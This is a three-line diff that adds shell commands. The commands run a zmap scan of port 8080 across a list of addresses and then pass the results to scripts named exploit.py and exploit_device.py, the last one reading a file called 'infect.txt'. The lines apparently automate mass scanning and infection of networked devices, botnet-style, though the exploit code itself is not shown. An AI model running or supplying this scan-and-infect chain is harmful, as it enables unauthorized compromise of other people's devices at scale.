@@ -1,0 +1,3 @@
+zmap -p8080 -w 1.txt -o uwu -B5M
+python exploit.py owo 80
+python exploit_device.py infect.txt 80
